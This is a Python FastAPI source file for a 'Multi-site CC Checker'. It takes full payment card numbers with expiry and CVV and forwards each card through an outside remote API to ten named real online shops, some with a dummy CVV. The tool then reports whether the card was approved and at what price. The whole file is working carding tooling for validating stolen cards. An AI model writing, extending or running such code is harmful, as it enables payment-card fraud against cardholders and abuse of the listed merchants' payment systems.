from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
import aiohttp
import asyncio
import time
import json
import urllib.parse
from typing import List, Dict, Any, Optional

app = FastAPI(title="Multi-site CC Checker")

# ------------ Configuration ------------
ALLOWED_GATEWAY = "killer"
ALLOWED_KEY = "rockybest"

SITES: List[str] = [
    "https://deltacloudz.com",
    "https://therapyessentials.coraphysicaltherapy.com",
    "https://bacteriostaticwater.com",
    "https://livelovespa.com",
    "https://divinebovinejerky.com",
    "https://casabelladecor.net",
    "https://lptmedical.com",
    "https://restart.brooksrunning.com",
    "https://safeandsoundhq.com",
    "https://urbanspaceinteriors.com"
]

REMOTE_API_TEMPLATE = "https://rockyysoon-fb0f.onrender.com//index.php?site={site}&cc={cc}"

PER_REQUEST_TIMEOUT = 20  # seconds
CONNECT_TIMEOUT = 60  # seconds
MAX_CONCURRENT = 5  # concurrency semaphore
# ---------------------------------------

def parse_cc(cc_raw: str):
    parts = cc_raw.split("|")
    if len(parts) < 4:
        raise ValueError("Invalid cc format. Expecting PAN|MM|YY|CVV")
    return parts[0], parts[1], parts[2], parts[3]

async def fetch_site(session: aiohttp.ClientSession, site: str, cc_for_site: str, sem: asyncio.Semaphore) -> Dict[str, Any]:
    url = REMOTE_API_TEMPLATE.replace("{site}", urllib.parse.quote_plus(site)).replace("{cc}", urllib.parse.quote_plus(cc_for_site))
    start = time.perf_counter()
    async with sem:
        try:
            timeout = aiohttp.ClientTimeout(total=PER_REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
            async with session.get(url, timeout=timeout) as resp:
                duration_ms = round((time.perf_counter() - start) * 1000, 2)
                raw_text = await resp.text()
                try:
                    parsed = json.loads(raw_text)
                except Exception:
                    parsed = {"error": "Invalid JSON", "raw": raw_text}
                return {
                    "site": site,
                    "url": url,
                    "cc": cc_for_site,
                    "response": parsed,
                    "http_status": resp.status,
                    "duration_ms": duration_ms
                }
        except Exception as e:
            duration_ms = round((time.perf_counter() - start) * 1000, 2)
            return {
                "site": site,
                "url": url,
                "cc": cc_for_site,
                "response": {"error": str(e)},
                "http_status": None,
                "duration_ms": duration_ms
            }

@app.get("/gateway")
async def gateway(request: Request):
    params = request.query_params
    gateway = params.get("gateway")
    key = params.get("key")
    cc_raw = params.get("cc")

    if not gateway or not key or not cc_raw:
        raise HTTPException(status_code=400, detail="Missing required parameters: gateway, key, cc")

    if gateway != ALLOWED_GATEWAY or key != ALLOWED_KEY:
        raise HTTPException(status_code=403, detail="Unauthorized gateway/key")

    try:
        pan, mm, yy, cvv = parse_cc(cc_raw)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    # Prepare CC for each site (first 5 use original CVV, last 5 use 000)
    cc_per_site = []
    for i, site in enumerate(SITES[:10]):
        cc_for_site = "|".join([pan, mm, yy, "000"]) if i >= 5 else cc_raw
        cc_per_site.append((site, cc_for_site))

    sem = asyncio.Semaphore(MAX_CONCURRENT)
    start_time = time.perf_counter()

    connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT)
    headers = {"User-Agent": "MultiSiteCCChecker/1.0", "Accept": "application/json"}

    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        tasks = [fetch_site(session, site, cc, sem) for site, cc in cc_per_site]
        results = await asyncio.gather(*tasks)

    total_time_sec = time.perf_counter() - start_time
    minutes = int(total_time_sec // 60)
    seconds = int(total_time_sec % 60)
    total_time_formatted = f"{minutes}m:{seconds}s"

    # Decide Gateway, Price, Status heuristics
    overall_gateway = "Authorize.net"
    overall_price = None
    overall_status = "unknown"
    overall_response = "UNKNOWN"

    for r in results:
        resp = r["response"]
        if isinstance(resp, dict):
            if "Price" in resp and resp["Price"] is not None:
                try:
                    overall_price = float(resp["Price"])
                except:
                    pass
            if "Status" in resp:
                overall_status = str(resp["Status"])
            if "Response" in resp:
                overall_response = str(resp["Response"])
            if "Gateway" in resp:
                overall_gateway = resp["Gateway"]

    final = {
        "Gateway": overall_gateway,
        "Price": overall_price,
        "Response": overall_response,
        "Status": overall_status,
        "cc": cc_raw,
        "total_time": total_time_formatted,
        "per_site": results
    }

    return JSONResponse(content=final)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=False)
